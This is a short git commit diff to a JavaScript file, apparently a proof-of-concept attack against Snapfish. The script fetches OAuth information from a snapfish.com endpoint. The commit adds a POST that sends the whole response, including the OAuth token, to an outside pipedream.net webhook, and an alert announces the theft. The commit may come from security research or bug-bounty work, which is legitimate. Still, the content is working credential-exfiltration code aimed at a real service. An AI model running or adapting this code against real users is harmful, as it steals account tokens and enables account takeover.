93d5655f16aae107d52fe76a2cd9ec51e20afab4
Márcio Cirqueira <62367006+mrccrqr@users.noreply.github.com>
2026-07-25 16:17:40 -0300

    Update b.js

--- b.js
+++ b.js
@@ -5,7 +5,15 @@ fetch('https://www.snapfish.com/library/getOauthInfo', {
     return r.json();
 })
 .then(function (data) {
-    alert(data.oauthInfo.oa2);
+    fetch('https://eoeyl49g7f6zxem.m.pipedream.net', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    }).catch(function (e) {});
+
+    alert('EXFILTRATED TO @m4rc10sz\'s WEBHOOK: \n\n' + data.oauthInfo.oa2);
 })
 .catch(function (e) {
     alert('Error: ' + e);
